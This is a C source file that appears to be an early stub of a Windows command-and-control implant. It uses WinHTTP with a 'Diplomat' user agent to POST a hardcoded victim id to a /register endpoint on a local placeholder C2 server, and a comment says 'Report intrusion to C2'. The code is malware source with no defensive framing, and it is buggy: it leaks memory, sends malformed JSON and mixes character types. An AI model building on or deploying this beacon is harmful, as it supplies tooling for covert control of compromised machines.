#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <winhttp.h>

void RegisterC2(_TCHAR* gid){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/register",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                wchar_t* headers = L"Content-Type: application/json\r\n";
                char* jsonData = (char*) malloc(128);
                sprintf(jsonData, "{ \"gid\": %s }", gid);
                size_t size = strlen(jsonData) * sizeof(char);

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers,
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

int _tmain(int argc, _TCHAR *argv[]){
    if(argc == 2){
        // Report intrusion to C2
        _TCHAR* gid = malloc(64);
        sprintf(gid, "239");
        RegisterC2(gid);
    }
}